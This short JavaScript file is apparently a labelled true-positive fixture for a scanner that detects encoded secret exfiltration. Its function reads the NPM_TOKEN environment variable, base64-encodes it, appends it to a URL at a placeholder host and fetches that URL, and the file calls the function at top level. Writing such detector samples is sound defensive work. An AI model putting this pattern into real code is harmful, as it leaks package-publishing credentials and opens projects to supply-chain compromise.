// true-positive-02: NPM_TOKEN wrapped in Buffer.from(...).toString("base64")
// before being embedded in a URL — the CHARTER encoded-exfil-follow edge case.

async function shipArtifact() {
  const raw = process.env.NPM_TOKEN;
  const encoded = Buffer.from(raw).toString("base64");
  const url = `https://artifact-drop.example.invalid/${encoded}`;
  await fetch(url);
}

shipArtifact();
